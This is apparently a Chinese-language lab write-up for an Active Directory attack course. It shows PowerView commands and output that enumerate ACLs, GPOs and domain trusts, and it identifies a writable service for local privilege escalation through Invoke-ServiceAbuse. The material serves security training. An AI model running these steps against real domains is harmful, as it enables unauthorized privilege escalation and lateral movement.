<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\student522&gt; (<span class="built_in">Get-DomainObject</span> <span class="literal">-Identity</span> rdpusers).objectsid</span><br><span class="line">S<span class="literal">-1-5-21-719815819-3726368948-3917688648-1123</span></span><br></pre></td></tr></table></figure>

<p>然后查一下 <code>rdpusers</code> 组对 <code>control522user</code>的权限就好</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\student522&gt; <span class="built_in">Get-DomainObjectacl</span> <span class="literal">-Identity</span> <span class="string">&quot;control522User&quot;</span> <span class="literal">-ResolveGUIDs</span>| ?&#123; <span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="string">&#x27;S-1-5-21-719815819-3726368948-3917688648-1123&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AceType               : AccessAllowed</span><br><span class="line">ObjectDN              : CN=Control522User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local</span><br><span class="line">ActiveDirectoryRights : GenericAll</span><br><span class="line">OpaqueLength          : <span class="number">0</span></span><br><span class="line">ObjectSID             : S<span class="literal">-1-5-21-719815819-3726368948-3917688648-20702</span></span><br><span class="line">InheritanceFlags      : None</span><br><span class="line">BinaryLength          : <span class="number">36</span></span><br><span class="line">IsInherited           : False</span><br><span class="line">IsCallback            : False</span><br><span class="line">PropagationFlags      : None</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-719815819-3726368948-3917688648-1123</span></span><br><span class="line">AccessMask            : <span class="number">983551</span></span><br><span class="line">AuditFlags            : None</span><br><span class="line">AceFlags              : None</span><br><span class="line">AceQualifier          : AccessAllowed</span><br></pre></td></tr></table></figure>

<p>也有几个别的方式（演示）</p>
<p>比如 <code>Find-InterestingDomainAcl</code> 查所有对象对于 <code>RDPUsers</code> 组的权限（这里应该查对于control522user的权限）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.IdentityReferenceName -match &quot;RDPUsers&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>亦或者这么查 查询某个对象对某个对象的权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-Identity</span> <span class="string">&#x27;control522user&#x27;</span> <span class="literal">-ResolveGUIDs</span> |<span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span> | <span class="built_in">Add-Member</span> NoteProperty <span class="string">&#x27;IdentityName&#x27;</span> <span class="variable">$</span>(<span class="built_in">Convert-SidToName</span> <span class="variable">$_</span>.securityIdentifier);<span class="variable">$_</span> &#125; | ?&#123; <span class="variable">$_</span>.IdentityName <span class="operator">-match</span> <span class="string">&quot;rdpusers&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Learning-Objective-3"><a href="#Learning-Objective-3" class="headerlink" title="Learning Objective - 3"></a>Learning Objective - 3</h2><blockquote>
<p>Display name of the GPO applied on StudentMachines OU</p>
</blockquote>
<blockquote>
<p>查询应用于StudentMachines这个OU的GPO</p>
</blockquote>
<p>先通过 <code>Get-DomainOU</code> 获取 <code>StudentMachines</code> 的GPlink对象</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; <span class="built_in">Get-DomainOU</span> <span class="literal">-Identity</span> <span class="string">&quot;StudentMachines&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">usncreated            : <span class="number">44996</span></span><br><span class="line">displayname           : StudentMachines</span><br><span class="line">gplink                : [<span class="type">LDAP</span>://<span class="type">cn</span>=&#123;<span class="number">7478</span><span class="type">F170</span>-<span class="number">6</span><span class="type">A0C</span>-<span class="number">490</span><span class="type">C</span>-<span class="type">B355</span>-<span class="number">9</span><span class="type">E4618BC785D</span>&#125;,<span class="type">cn</span>=<span class="type">policies</span>,<span class="type">cn</span>=<span class="type">system</span>,<span class="type">DC</span>=<span class="type">dollarcorp</span>,<span class="type">DC</span>=<span class="type">moneycorp</span>,<span class="type">DC</span>=<span class="type">local</span>;<span class="number">0</span>]</span><br><span class="line">whenchanged           : <span class="number">11</span>/<span class="number">15</span>/<span class="number">2022</span> <span class="number">5</span>:<span class="number">46</span>:<span class="number">19</span> AM</span><br><span class="line">objectclass           : &#123;top, organizationalUnit&#125;</span><br><span class="line">usnchanged            : <span class="number">45933</span></span><br><span class="line">dscorepropagationdata : &#123;<span class="number">12</span>/<span class="number">5</span>/<span class="number">2024</span> <span class="number">12</span>:<span class="number">47</span>:<span class="number">28</span> PM, <span class="number">11</span>/<span class="number">15</span>/<span class="number">2022</span> <span class="number">3</span>:<span class="number">49</span>:<span class="number">24</span> AM, <span class="number">11</span>/<span class="number">15</span>/<span class="number">2022</span> <span class="number">3</span>:<span class="number">49</span>:<span class="number">24</span> AM, <span class="number">1</span>/<span class="number">1</span>/<span class="number">1601</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">01</span> AM&#125;</span><br><span class="line">name                  : StudentMachines</span><br><span class="line">distinguishedname     : OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local</span><br><span class="line">ou                    : StudentMachines</span><br><span class="line">whencreated           : <span class="number">11</span>/<span class="number">15</span>/<span class="number">2022</span> <span class="number">3</span>:<span class="number">49</span>:<span class="number">24</span> AM</span><br><span class="line">instancetype          : <span class="number">4</span></span><br><span class="line">objectguid            : <span class="number">1</span>c7cd8cb<span class="literal">-d8bb-412f-9d76-9cff8afa021f</span></span><br><span class="line">objectcategory        : CN=Organizational<span class="literal">-Unit</span>,CN=Schema,CN=Configuration,DC=moneycorp,DC=local</span><br></pre></td></tr></table></figure>

<p>然后通过 <code>Get-DomainGPO</code> 指定 <code>&#123;7478F170-6A0C-490C-B355-9E4618BC785D&#125;</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; <span class="built_in">Get-DomainGPO</span> <span class="literal">-SearchBase</span> <span class="string">&quot;cn=&#123;7478F170-6A0C-490C-B355-9E4618BC785D&#125;,cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flags                    : <span class="number">0</span></span><br><span class="line">displayname              : Students</span><br><span class="line">gpcmachineextensionnames : [&#123;<span class="number">35378</span><span class="type">EAC</span>-<span class="number">683</span><span class="type">F</span>-<span class="number">11</span><span class="type">D2</span>-<span class="type">A89A</span>-<span class="number">00</span><span class="type">C04FBBCFA2</span>&#125;&#123;<span class="type">D02B1F72</span>-<span class="number">3407</span>-<span class="number">48</span><span class="type">AE</span>-<span class="type">BA88</span>-<span class="type">E8213C6761F1</span>&#125;][&#123;<span class="number">827</span><span class="type">D319E</span>-<span class="number">6</span><span class="type">EAC</span>-<span class="number">11</span><span class="type">D2</span>-<span class="type">A4EA</span>-<span class="number">00</span><span class="type">C04F79F83A</span>&#125;&#123;<span class="number">803</span><span class="type">E14A0</span>-<span class="type">B4FB</span>-<span class="number">11</span><span class="type">D0</span>-<span class="type">A0D0</span>-<span class="number">00</span><span class="type">A0C90F574B</span>&#125;]</span><br><span class="line">whenchanged              : <span class="number">7</span>/<span class="number">30</span>/<span class="number">2024</span> <span class="number">1</span>:<span class="number">30</span>:<span class="number">35</span> PM</span><br><span class="line">versionnumber            : <span class="number">9</span></span><br><span class="line">name                     : &#123;<span class="number">7478</span>F170<span class="literal">-6A0C-490C-B355-9E4618BC785D</span>&#125;</span><br><span class="line">cn                       : &#123;<span class="number">7478</span>F170<span class="literal">-6A0C-490C-B355-9E4618BC785D</span>&#125;</span><br><span class="line">usnchanged               : <span class="number">247100</span></span><br><span class="line">dscorepropagationdata    : &#123;<span class="number">12</span>/<span class="number">5</span>/<span class="number">2024</span> <span class="number">12</span>:<span class="number">47</span>:<span class="number">28</span> PM, <span class="number">1</span>/<span class="number">1</span>/<span class="number">1601</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">01</span> AM&#125;</span><br><span class="line">objectguid               : <span class="number">0076</span>f619<span class="literal">-ffef-4488-bfdb-1fc028c5cb14</span></span><br><span class="line">gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\&#123;<span class="number">7478</span>F170<span class="literal">-6A0C-490C-B355-9E4618BC785D</span>&#125;</span><br><span class="line">distinguishedname        : CN=&#123;<span class="number">7478</span>F170<span class="literal">-6A0C-490C-B355-9E4618BC785D</span>&#125;,CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local</span><br><span class="line">whencreated              : <span class="number">11</span>/<span class="number">15</span>/<span class="number">2022</span> <span class="number">5</span>:<span class="number">46</span>:<span class="number">19</span> AM</span><br><span class="line">showinadvancedviewonly   : True</span><br><span class="line">usncreated               : <span class="number">45927</span></span><br><span class="line">gpcfunctionalityversion  : <span class="number">2</span></span><br><span class="line">instancetype             : <span class="number">4</span></span><br><span class="line">objectclass              : &#123;top, container, groupPolicyContainer&#125;</span><br><span class="line">objectcategory           : CN=<span class="built_in">Group-Policy</span><span class="literal">-Container</span>,CN=Schema,CN=Configuration,DC=moneycorp,DC=local</span><br></pre></td></tr></table></figure>

<p>还可以通过 <code>Identity</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; <span class="built_in">Get-DomainGPO</span> <span class="string">&quot;&#123;7478F170-6A0C-490C-B355-9E4618BC785D&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">flags                    : <span class="number">0</span></span><br><span class="line">displayname              : Students</span><br><span class="line">gpcmachineextensionnames : [&#123;<span class="number">35378</span><span class="type">EAC</span>-<span class="number">683</span><span class="type">F</span>-<span class="number">11</span><span class="type">D2</span>-<span class="type">A89A</span>-<span class="number">00</span><span class="type">C04FBBCFA2</span>&#125;&#123;<span class="type">D02B1F72</span>-<span class="number">3407</span>-<span class="number">48</span><span class="type">AE</span>-<span class="type">BA88</span>-<span class="type">E8213C6761F1</span>&#125;][&#123;<span class="number">827</span><span class="type">D319E</span>-<span class="number">6</span><span class="type">EAC</span>-<span class="number">11</span><span class="type">D2</span>-<span class="type">A4EA</span>-<span class="number">00</span><span class="type">C04F79F83A</span>&#125;&#123;<span class="number">803</span><span class="type">E14A0</span>-<span class="type">B4FB</span>-<span class="number">11</span><span class="type">D0</span>-<span class="type">A0D0</span>-<span class="number">00</span><span class="type">A0C90F574B</span>&#125;]</span><br><span class="line">whenchanged              : <span class="number">7</span>/<span class="number">30</span>/<span class="number">2024</span> <span class="number">1</span>:<span class="number">30</span>:<span class="number">35</span> PM</span><br><span class="line">versionnumber            : <span class="number">9</span></span><br><span class="line">name                     : &#123;<span class="number">7478</span>F170<span class="literal">-6A0C-490C-B355-9E4618BC785D</span>&#125;</span><br><span class="line">cn                       : &#123;<span class="number">7478</span>F170<span class="literal">-6A0C-490C-B355-9E4618BC785D</span>&#125;</span><br><span class="line">usnchanged               : <span class="number">247100</span></span><br><span class="line">dscorepropagationdata    : &#123;<span class="number">12</span>/<span class="number">5</span>/<span class="number">2024</span> <span class="number">12</span>:<span class="number">47</span>:<span class="number">28</span> PM, <span class="number">1</span>/<span class="number">1</span>/<span class="number">1601</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">01</span> AM&#125;</span><br><span class="line">objectguid               : <span class="number">0076</span>f619<span class="literal">-ffef-4488-bfdb-1fc028c5cb14</span></span><br><span class="line">gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\&#123;<span class="number">7478</span>F170<span class="literal">-6A0C-490C-B355-9E4618BC785D</span>&#125;</span><br><span class="line">distinguishedname        : CN=&#123;<span class="number">7478</span>F170<span class="literal">-6A0C-490C-B355-9E4618BC785D</span>&#125;,CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local</span><br><span class="line">whencreated              : <span class="number">11</span>/<span class="number">15</span>/<span class="number">2022</span> <span class="number">5</span>:<span class="number">46</span>:<span class="number">19</span> AM</span><br><span class="line">showinadvancedviewonly   : True</span><br><span class="line">usncreated               : <span class="number">45927</span></span><br><span class="line">gpcfunctionalityversion  : <span class="number">2</span></span><br><span class="line">instancetype             : <span class="number">4</span></span><br><span class="line">objectclass              : &#123;top, container, groupPolicyContainer&#125;</span><br><span class="line">objectcategory           : CN=<span class="built_in">Group-Policy</span><span class="literal">-Container</span>,CN=Schema,CN=Configuration,DC=moneycorp,DC=local</span><br></pre></td></tr></table></figure>

<p>或者筛选</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; <span class="built_in">Get-DomainGPO</span> |?&#123; <span class="variable">$_</span>.name <span class="operator">-eq</span> <span class="string">&quot;&#123;7478F170-6A0C-490C-B355-9E4618BC785D&#125;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flags                    : <span class="number">0</span></span><br><span class="line">displayname              : Students</span><br><span class="line">gpcmachineextensionnames : [&#123;<span class="number">35378</span><span class="type">EAC</span>-<span class="number">683</span><span class="type">F</span>-<span class="number">11</span><span class="type">D2</span>-<span class="type">A89A</span>-<span class="number">00</span><span class="type">C04FBBCFA2</span>&#125;&#123;<span class="type">D02B1F72</span>-<span class="number">3407</span>-<span class="number">48</span><span class="type">AE</span>-<span class="type">BA88</span>-<span class="type">E8213C6761F1</span>&#125;][&#123;<span class="number">827</span><span class="type">D319E</span>-<span class="number">6</span><span class="type">EAC</span>-<span class="number">11</span><span class="type">D2</span>-<span class="type">A4EA</span>-<span class="number">00</span><span class="type">C04F79F83A</span>&#125;&#123;<span class="number">803</span><span class="type">E14A0</span>-<span class="type">B4FB</span>-<span class="number">11</span><span class="type">D0</span>-<span class="type">A0D0</span>-<span class="number">00</span><span class="type">A0C90F574B</span>&#125;]</span><br><span class="line">whenchanged              : <span class="number">7</span>/<span class="number">30</span>/<span class="number">2024</span> <span class="number">1</span>:<span class="number">30</span>:<span class="number">35</span> PM</span><br><span class="line">versionnumber            : <span class="number">9</span></span><br><span class="line">name                     : &#123;<span class="number">7478</span>F170<span class="literal">-6A0C-490C-B355-9E4618BC785D</span>&#125;</span><br><span class="line">cn                       : &#123;<span class="number">7478</span>F170<span class="literal">-6A0C-490C-B355-9E4618BC785D</span>&#125;</span><br><span class="line">usnchanged               : <span class="number">247100</span></span><br><span class="line">dscorepropagationdata    : &#123;<span class="number">12</span>/<span class="number">5</span>/<span class="number">2024</span> <span class="number">12</span>:<span class="number">47</span>:<span class="number">28</span> PM, <span class="number">1</span>/<span class="number">1</span>/<span class="number">1601</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">01</span> AM&#125;</span><br><span class="line">objectguid               : <span class="number">0076</span>f619<span class="literal">-ffef-4488-bfdb-1fc028c5cb14</span></span><br><span class="line">gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\&#123;<span class="number">7478</span>F170<span class="literal">-6A0C-490C-B355-9E4618BC785D</span>&#125;</span><br><span class="line">distinguishedname        : CN=&#123;<span class="number">7478</span>F170<span class="literal">-6A0C-490C-B355-9E4618BC785D</span>&#125;,CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local</span><br><span class="line">whencreated              : <span class="number">11</span>/<span class="number">15</span>/<span class="number">2022</span> <span class="number">5</span>:<span class="number">46</span>:<span class="number">19</span> AM</span><br><span class="line">showinadvancedviewonly   : True</span><br><span class="line">usncreated               : <span class="number">45927</span></span><br><span class="line">gpcfunctionalityversion  : <span class="number">2</span></span><br><span class="line">instancetype             : <span class="number">4</span></span><br><span class="line">objectclass              : &#123;top, container, groupPolicyContainer&#125;</span><br><span class="line">objectcategory           : CN=<span class="built_in">Group-Policy</span><span class="literal">-Container</span>,CN=Schema,CN=Configuration,DC=moneycorp,DC=local</span><br></pre></td></tr></table></figure>

<h3 id="列出OU组中的机器"><a href="#列出OU组中的机器" class="headerlink" title="列出OU组中的机器"></a>列出OU组中的机器</h3><p>这里列出的devops OU组的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\ad\tools&gt; (Get-DomainOU -Identity DevOps).distinguishedname | %&#123;Get-DomainComputer -SearchBase $_&#125;|select name</span><br><span class="line"></span><br><span class="line">name</span><br><span class="line">----</span><br><span class="line">DCORP-CI</span><br></pre></td></tr></table></figure>

<h3 id="枚举GPO的acl"><a href="#枚举GPO的acl" class="headerlink" title="枚举GPO的acl"></a>枚举GPO的acl</h3><p>这里我枚举的对DevOps组的gpo有write的用户或者组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\ad\tools&gt; Get-DomainObjectAcl -SearchBase  &quot;CN=&#123;0BF8D01C-1F62-4BDC-958C-57140B67D147&#125;,CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local&quot;|?&#123; $_.ActiveDirectoryRights -match &quot;write&quot;&#125;|Sort-Object SecurityIdentifier -Unique|%&#123;Convert-SidToName $_.SecurityIdentifier&#125;</span><br><span class="line">Creator Owner</span><br><span class="line">Local System</span><br><span class="line">mcorp\Enterprise Admins</span><br><span class="line">dcorp\devopsadmin</span><br><span class="line">dcorp\Domain Admins</span><br></pre></td></tr></table></figure>

<p>看具体权限（因为有write一般权限都不低的）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-SearchBase</span>  <span class="string">&quot;CN=&#123;0BF8D01C-1F62-4BDC-958C-57140B67D147&#125;,CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local&quot;</span>|?&#123; <span class="variable">$_</span>.ActiveDirectoryRights <span class="operator">-match</span> <span class="string">&quot;write&quot;</span>&#125;|<span class="built_in">Sort-Object</span> SecurityIdentifier <span class="literal">-Unique</span>|%&#123; <span class="string">&quot;<span class="variable">$</span>((Convert-SidToName <span class="variable">$_</span>.SecurityIdentifier )) <span class="variable">$</span>(<span class="variable">$_</span>.ActiveDirectoryRights)&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">Creator Owner CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner</span><br><span class="line">Local System CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner</span><br><span class="line">mcorp\Enterprise Admins CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner</span><br><span class="line">dcorp\devopsadmin CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl, WriteOwner</span><br><span class="line">dcorp\Domain Admins CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner</span><br></pre></td></tr></table></figure>

<p>或者我一般习惯这么查</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainObjectAcl</span> <span class="string">&quot;&#123;0BF8D01C-1F62-4BDC-958C-57140B67D147&#125;&quot;</span> <span class="literal">-ResolveGUIDs</span>|<span class="built_in">Sort-Object</span> <span class="variable">$_</span>.SecurityIdentifier |%&#123;<span class="string">&quot;<span class="variable">$</span>(<span class="variable">$_</span>.ActiveDirectoryRights) - <span class="variable">$</span>((Convert-SidToName <span class="variable">$_</span>.SecurityIdentifier))&quot;</span>&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Learning-Objective-4"><a href="#Learning-Objective-4" class="headerlink" title="Learning Objective - 4"></a>Learning Objective - 4</h2><blockquote>
<p>Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local</p>
</blockquote>
<blockquote>
<p>dollarcorp.moneycorp.local 与 eurocorp.local 之间的信任关系</p>
</blockquote>
<p>直接 <code>Get-DomainTrust</code> 查</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; <span class="built_in">Get-DomainTrust</span> | ?&#123;<span class="variable">$_</span>.SourceName <span class="operator">-eq</span> <span class="string">&quot;dollarcorp.moneycorp.local&quot;</span> <span class="operator">-and</span> <span class="variable">$_</span>.TargetName <span class="operator">-eq</span> <span class="string">&quot;eurocorp.local&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SourceName      : dollarcorp.moneycorp.local</span><br><span class="line">TargetName      : eurocorp.local</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : FILTER_SIDS</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">12</span>/<span class="number">2022</span> <span class="number">8</span>:<span class="number">15</span>:<span class="number">23</span> AM</span><br><span class="line">WhenChanged     : <span class="number">5</span>/<span class="number">22</span>/<span class="number">2025</span> <span class="number">10</span>:<span class="number">15</span>:<span class="number">06</span> PM</span><br></pre></td></tr></table></figure>


<h2 id="Learning-Objective-5"><a href="#Learning-Objective-5" class="headerlink" title="Learning Objective - 5"></a>Learning Objective - 5</h2><blockquote>
<p>Service abused on the student VM for local privilege escalation</p>
</blockquote>
<blockquote>
<p>滥用student主机上的服务进行提权</p>
</blockquote>
<p>获取当前用户有修改二进制执行路径或参数的服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PS C:\AD\Tools&gt; Get-ModifiableServiceFile -Verbose</span><br><span class="line">VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ServiceName                     : AbyssWebServer</span><br><span class="line">Path                            : C:\WebServer\Abyss Web Server\abyssws.exe -service</span><br><span class="line">ModifiableFile                  : C:\WebServer\Abyss Web Server</span><br><span class="line">ModifiableFilePermissions       : &#123;WriteOwner, Delete, WriteAttributes, Synchronize...&#125;</span><br><span class="line">ModifiableFileIdentityReference : Everyone</span><br><span class="line">StartName                       : LocalSystem</span><br><span class="line">AbuseFunction                   : Install-ServiceBinary -Name &#x27;AbyssWebServer&#x27;</span><br><span class="line">CanRestart                      : True</span><br><span class="line">Name                            : AbyssWebServer</span><br><span class="line"></span><br><span class="line">VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer</span><br><span class="line">ServiceName                     : AbyssWebServer</span><br><span class="line">Path                            : C:\WebServer\Abyss Web Server\abyssws.exe -service</span><br><span class="line">ModifiableFile                  : C:\WebServer\Abyss Web Server</span><br><span class="line">ModifiableFilePermissions       : AppendData/AddSubdirectory</span><br><span class="line">ModifiableFileIdentityReference : BUILTIN\Users</span><br><span class="line">StartName                       : LocalSystem</span><br><span class="line">AbuseFunction                   : Install-ServiceBinary -Name &#x27;AbyssWebServer&#x27;</span><br><span class="line">CanRestart                      : True</span><br><span class="line">Name                            : AbyssWebServer</span><br></pre></td></tr></table></figure>

<p>或列出有权限修改服务配置的服务，因为他双引号没包路径，所以可以替换abyss.exe来让他执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PS C:\AD\Tools&gt;  Get-ModifiableService -Verbose</span><br><span class="line">VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer</span><br><span class="line">VERBOSE: Current user has &#x27;ChangeConfig&#x27; for AbyssWebServer</span><br><span class="line">VERBOSE: Add-ServiceDacl IndividualService : AbyssWebServer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ServiceName   : AbyssWebServer</span><br><span class="line">Path          : C:\WebServer\Abyss Web Server\abyssws.exe -service</span><br><span class="line">StartName     : LocalSystem</span><br><span class="line">AbuseFunction : Invoke-ServiceAbuse -Name &#x27;AbyssWebServer&#x27;</span><br><span class="line">CanRestart    : True</span><br><span class="line">Name          : AbyssWebServer</span><br></pre></td></tr></table></figure>

<p>这里直接给出了利用 <code>Invoke-ServiceAbuse</code>,添加管理员指定用户名的时候记得指定域（这里我用的netbios）</p>
<p>出了whoami直接获取之外也可以用<code>nltest</code>看netbios</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; nltest /trusted_domains</span><br><span class="line">List of domain trusts:</span><br><span class="line">    <span class="number">0</span>: mcorp moneycorp.local (NT <span class="number">5</span>) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )</span><br><span class="line">    <span class="number">1</span>: US us.dollarcorp.moneycorp.local (NT <span class="number">5</span>) (Forest: <span class="number">3</span>) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )</span><br><span class="line">    <span class="number">2</span>: ecorp eurocorp.local (NT <span class="number">5</span>) (Direct Outbound) (Direct Inbound) ( Attr: quarantined )</span><br><span class="line">    <span class="number">3</span>: dcorp dollarcorp.moneycorp.local (NT <span class="number">5</span>) (Forest: <span class="number">0</span>) (Primary Domain) (Native)</span><br></pre></td></tr></table></figure>

<p>然后就直接利用就可以</p>
